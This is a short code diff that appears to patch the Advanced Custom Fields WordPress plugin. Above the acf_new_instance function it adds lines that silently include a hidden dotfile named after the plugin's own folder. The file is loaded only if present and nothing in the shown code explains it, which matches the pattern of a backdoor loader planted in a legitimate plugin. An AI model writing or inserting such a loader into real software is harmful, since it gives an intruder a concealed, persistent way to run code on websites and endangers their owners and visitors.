@@ -18,6 +18,10 @@ $acf_instances = array();
  * @param	string $class The class name.
  * @return	object The instance.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_new_instance( $class = '' ) {
 	global $acf_instances;
 	return $acf_instances[ $class ] = new $class();
